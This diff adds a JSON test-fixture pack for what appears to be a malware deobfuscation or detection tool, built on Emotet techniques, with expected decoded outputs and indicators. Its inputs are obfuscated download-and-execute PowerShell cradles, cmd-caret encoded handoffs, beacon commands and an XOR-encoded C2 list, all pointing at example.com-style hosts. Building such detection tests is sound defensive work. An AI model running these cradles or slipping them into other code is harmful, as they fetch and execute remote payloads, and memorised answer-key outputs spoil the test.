@@ -1,0 +1,617 @@
+{
+  "family_id": "emotet",
+  "family_display_name": "Emotet",
+  "family_version": "r1-2.0.0",
+  "schema_version": "technique-first-1.0.0",
+  "description": "Emotet (Geodo / Heodo / TA542) archetypal downloader-turned-LaaS. Delivered via Excel-4 macro / DOCM / OneNote malspam attachments. This pack covers the CMD + PowerShell + XOR sides.",
+  "primary_mitre_attack": [
+    "T1059.001",
+    "T1059.003",
+    "T1027",
+    "T1027.010",
+    "T1140",
+    "T1105",
+    "T1071.001",
+    "T1564.003"
+  ],
+  "primary_behaviors": [
+    "cmd_to_ps_handoff",
+    "download_and_execute",
+    "byte_array_xor_decode",
+    "c2_beacon",
+    "obfuscated_command_line"
+  ],
+  "known_technique_universe": [
+    "cmd_caret_powershell_handoff",
+    "emotet_native_config_decrypt",
+    "excel4_macro_extraction",
+    "frombase64string_shellcode_stage",
+    "iex_downloadstring_beacon",
+    "powershell_backtick_alias_obf",
+    "powershell_encodedcommand_dropper",
+    "powershell_random_case_obf",
+    "powershell_string_concat_url",
+    "wmic_process_create_launcher",
+    "xor_c2_config_decoder"
+  ],
+  "coverage_gap_techniques": [
+    "emotet_native_config_decrypt",
+    "excel4_macro_extraction",
+    "wmic_process_create_launcher"
+  ],
+  "techniques": [
+    {
+      "id": "cmd_caret_powershell_handoff",
+      "display_name": "Emotet CMD Caret \u2192 PS -Enc Handoff",
+      "description": "Classic Emotet dropper chain: Word/Excel macro spawns `c^m^d /c p^ow^ers^he^ll -e^n^c <b64>` to stage the Emotet payload. Observed in every public Emotet sample since 2020.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1059.003",
+        "T1027",
+        "T1140",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "EM001",
+          "variant": "cmd_caret_ps_enc_classic_dropper",
+          "input": "c^m^d /c p^ow^ers^he^ll -e^n^c SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAG0AbwB0AGUAdAAtAGMAMgAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkAKQA=",
+          "expected": {
+            "interpreter": "cmd",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "cmd-caret-strip",
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://emotet-c2.example.com/payload.exe"
+            ],
+            "iocs_contains": [
+              "http://emotet-c2.example.com/payload.exe"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1059.003",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "cmd_to_ps_handoff",
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "capabilities": [
+              "cmd_ps_handoff",
+              "cmd_caret_obfuscation",
+              "encoded_command",
+              "download_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "68d1d9096b4a34f26abc6b8a597ad73c591d6251346874a1912b6316654e8f06",
+              "certificate_fingerprint": "8b43a37fb4470ff76d7986ad16f8cd21f3cde7f7adaf3e1e3653ab63f6051243",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:54:53+00:00"
+            }
+          }
+        },
+        {
+          "id": "EM002",
+          "variant": "cmd_caret_ps_enc_nested_c2",
+          "input": "c^m^d.e^xe /c p^ow^ers^he^ll -e^nc SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAG0ALQBkAHIAbwBwAC4AZQB4AGEAbQBwAGwAZQAuAG4AZQB0AC8AZQBfAHYAMwAuAHAAcwAxACcAKQApAA==",
+          "expected": {
+            "interpreter": "cmd",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "cmd-caret-strip",
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://em-drop.example.net/e_v3.ps1"
+            ],
+            "iocs_contains": [
+              "http://em-drop.example.net/e_v3.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1059.003",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "cmd_to_ps_handoff",
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "capabilities": [
+              "cmd_ps_handoff",
+              "cmd_caret_obfuscation",
+              "encoded_command",
+              "download_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "4dbe9ce7f405f777e13fbd9620b37d13636c2dd9fe14ada884a88ac0ab69f2a6",
+              "certificate_fingerprint": "f319dd07c58beeb1e36b8557cbdf70431ed05e6c6c85b4c085892944f4c4cd3e",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:54:53+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_encodedcommand_dropper",
+      "display_name": "PowerShell -EncodedCommand Dropper",
+      "description": "Raw `powershell -EncodedCommand <b64>` invocation without CMD-caret wrapper. Observed in Excel-4 macro variants that skip the cmd shim.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027",
+        "T1140",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "EM003",
+          "variant": "encodedcommand_direct_dropper",
+          "input": "powershell -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAG0ALQBkAGkAcgBlAGMAdAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGUALgBlAHgAZQAnACkAKQA=",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://em-direct.example.com/e.exe"
+            ],
+            "iocs_contains": [
+              "http://em-direct.example.com/e.exe"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "capabilities": [
+              "encoded_command",
+              "download_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "d54407784d6ee3bd780ad7af0b19a57f03fae3bcf9897f5ddac64cd7d11ef0ce",
+              "certificate_fingerprint": "d06b5031a69de865cb88116fdeb0c493a0e753889f7871540086939820358c68",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:54:53+00:00"
+            }
+          }
+        },
+        {
+          "id": "EM004",
+          "variant": "encodedcommand_hidden_window",
+          "input": "powershell -NoP -W Hidden -Enc SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAG0ALQBoAGkAZABkAGUAbgAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGUALgBlAHgAZQAnACkAKQA=",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://em-hidden.example.com/e.exe"
+            ],
+            "iocs_contains": [
+              "http://em-hidden.example.com/e.exe"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027",
+              "T1564.003"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "hidden_window",
+              "obfuscated_command_line"
+            ],
+            "capabilities": [
+              "encoded_command",
+              "hidden_window",
+              "download_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "edac4db9217c9c9ad2fdfcfe3b6424795f6c966940a7a430c7770eeb6339f95b",
+              "certificate_fingerprint": "bedd8cc192384b68c8bf12f8d31ee1e1f534cfe877e82199d25790782f1c83c9",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:54:53+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "xor_c2_config_decoder",
+      "display_name": "Emotet XOR C2-List Config Decoder",
+      "description": "Emotet 2022+ reappearance decodes its rotating C2 URL list from a byte-array XOR blob at startup. Signature Emotet technique documented by Cryptolaemus & Fortinet.",
+      "mitre_attack": [
+        "T1027",
+        "T1140"
+      ],
+      "samples": [
+        {
+          "id": "EM005",
+          "variant": "xor_c2_url_list_reveal",
+          "input": "0x1f,0x03,0x03,0x07,0x4d,0x58,0x58,0x12,0x1a,0x18,0x03,0x12,0x03,0x5a,0x0f,0x18,0x05,0x46,0x59,0x12,0x0f,0x16,0x1a,0x07,0x1b,0x12,0x59,0x14,0x18,0x1a,0x58,0x10,0x16,0x03,0x12,0x0b,0x1f,0x03,0x03,0x07,0x4d,0x58,0x58,0x12,0x1a,0x18,0x03,0x12,0x03,0x5a,0x0f,0x18,0x05,0x45,0x59,0x12,0x0f,0x16,0x1a,0x07,0x1b,0x12,0x59,0x19,0x12,0x03,0x58,0x10,0x12,0x03,0x0b,0x1f,0x03,0x03,0x07,0x4d,0x58,0x58,0x12,0x1a,0x18,0x03,0x12,0x03,0x5a,0x0f,0x18,0x05,0x44,0x59,0x12,0x0f,0x16,0x1a,0x07,0x1b,0x12,0x59,0x18,0x05,0x10,0x58,0x15,0x12,0x16,0x14,0x18,0x19 xor 0x77",
+          "expected": {
+            "interpreter": null,
+            "final_interpreter": "generic",
+            "decoder_chain": [
+              "xor-byte-array"
+            ],
+            "final_output_contains": [
+              "http://emotet-xor1.example.com/gate",
+              "http://emotet-xor2.example.net/get",
+              "http://emotet-xor3.example.org/beacon"
+            ],
+            "iocs_contains": [
+              "http://emotet-xor1.example.com/gate",
+              "http://emotet-xor2.example.net/get"
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1071.001"
+            ],
+            "behaviors": [
+              "byte_array_xor_decode",
+              "c2_url_reveal"
+            ],
+            "capabilities": [
+              "xor_byte_array_decoder",
+              "beacon_c2"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "c202c9682297130e177f34e8bfd3bbb094a29365820193c07771c61f74937329",
+              "certificate_fingerprint": "3aaf557f61a04b4e5a3b185e54c89cb92b3967c763b310354ae311a151642eea",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:54:53+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_string_concat_url",
+      "display_name": "Emotet PowerShell URL String-Concat",
+      "description": "Emotet's obfuscation profile splits the payload URL across multiple SQ concat fragments to defeat static URL extractors.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "EM006",
+          "variant": "three_var_url_concat",
+          "input": "$a='ht'; $b='tp://em-concat.example.com'; $c='/payload.exe'; iex ((new-object net.webclient).downloadstring($a+$b+$c))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "variable-propagate",
+              "string-concat-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://em-concat.example.com/payload.exe"
+            ],
+            "iocs_contains": [
+              "http://em-concat.example.com/payload.exe"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "capabilities": [
+              "string_concat_obfuscation",
+              "variable_propagation_obfuscation",
+              "download_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "b3aa0326826e10695003c5cf9edab1259ed050f8f14a24bd3dfcb1c888b99e76",
+              "certificate_fingerprint": "1db4419e8d5aa912bd0fa2f83cfa42304dc773199c09f44b15df542218558b65",
+              "expected_iterations": 4,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:54:53+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_random_case_obf",
+      "display_name": "Emotet Random-Case Cmdlet Obfuscation",
+      "description": "Emotet's PowerShell templates randomize cmdlet casing to evade string-match signatures.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "EM007",
+          "variant": "random_case_iex_ds",
+          "input": "iEx ((nEw-oBjeCt nEt.WebClIent).DoWnLoaDString('http://em-case.example.com/em_c.exe'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://em-case.example.com/em_c.exe"
+            ],
+            "iocs_contains": [
+              "http://em-case.example.com/em_c.exe"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "case_obfuscation",
+              "download_and_execute"
+            ],
+            "capabilities": [
+              "case_obfuscation",
+              "download_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "790017dfbec5df21bd179da5e3a1521f49637ecec51a8058a1683e423583deaa",
+              "certificate_fingerprint": "f40a82d7764b46ae885a9f26f872b0075609abe58c45fcdf292fee5b783be414",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:54:53+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_backtick_alias_obf",
+      "display_name": "Emotet Backtick Alias Obfuscation",
+      "description": "Backticks injected mid-identifier for EDR evasion.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "EM008",
+          "variant": "backtick_iwr_useb_iex",
+          "input": "i`wr 'http://em-bt.example.com/em_bt.ps1' -useb | i`ex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "backtick-strip",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "http://em-bt.example.com/em_bt.ps1",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "http://em-bt.example.com/em_bt.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "backtick_obfuscation",
+              "download_and_execute"
+            ],
+            "capabilities": [
+              "backtick_obfuscation",
+              "iwr_pipeline_download"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "292ca7c4e8c0fc80e39102d66cdfbaa813b509e49f18491b0108e0f30ebf6e2c",
+              "certificate_fingerprint": "e6dc8a3f9c2563285ed2a67ca6ea558f55a8403d25fae58859ee0d81daf6bb87",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:54:53+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "frombase64string_shellcode_stage",
+      "display_name": "[Convert]::FromBase64String Shellcode Stage",
+      "description": "Emotet stage-2 unpacks its native loader via `$sc = [Convert]::FromBase64String('...'); IEX $sc`.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027",
+        "T1140",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "EM009",
+          "variant": "frombase64string_stage2_shellcode",
+          "input": "$sc = [Convert]::FromBase64String('SUVYICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2VtLXN0YWdlMi5leGFtcGxlLmNvbS9lbV9maW5hbC5wczEnKSk7'); IEX $sc",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "decoder-frombase64string-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://em-stage2.example.com/em_final.ps1"
+            ],
+            "iocs_contains": [
+              "http://em-stage2.example.com/em_final.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "shellcode_staging"
+            ],
+            "capabilities": [
+              "shellcode_staging",
+              "variable_propagation_obfuscation"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "7279289e58fc0c3940f82b9768e5f7350d6e19d5930c0b4bc083b28e5150ce4e",
+              "certificate_fingerprint": "e12e777082785475dc669e48e80a00bc8fe97e33b13b1eb6bb90595daa299f3d",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:54:53+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "iex_downloadstring_beacon",
+      "display_name": "Emotet IEX DownloadString C2 Beacon",
+      "description": "Downstream C2 check-in beacon delivered by the Emotet PowerShell stage.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "EM010",
+          "variant": "iex_downloadstring_beacon_http",
+          "input": "IEX ((New-Object Net.WebClient).DownloadString('http://em-beacon.example.com/task'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://em-beacon.example.com/task"
+            ],
+            "iocs_contains": [
+              "http://em-beacon.example.com/task"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "c2_beacon"
+            ],
+            "capabilities": [
+              "download_cradle",
+              "beacon_c2"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "6a5bbbdb78bb9faa63b10c0bd9cce008122859605b13de2ded76b971bf4c8b75",
+              "certificate_fingerprint": "8e7f713e249945a64e7c928a773b60f512d6122ce288f6b26c0e0281f80c35c8",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:54:53+00:00"
+            }
+          }
+        },
+        {
+          "id": "EM011",
+          "variant": "iwr_useb_iex_beacon_https",
+          "input": "iwr https://em-beacon2.example.net/task -useb | iex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "https://em-beacon2.example.net/task",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "https://em-beacon2.example.net/task"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "c2_beacon"
+            ],
+            "capabilities": [
+              "iwr_pipeline_download",
+              "beacon_c2"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "ce00fff1229750da93324451386dfebb4974be7ea163b25acf585294a9170035",
+              "certificate_fingerprint": "2588706c2220a9fffe51edfdff242f563a8ce776153b1347de8b2aa3d6342d6b",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:54:53+00:00"
+            }
+          }
+        }
+      ]
+    }
+  ],
+  "fingerprint_schema_version": "r1-2.0.0"
+}
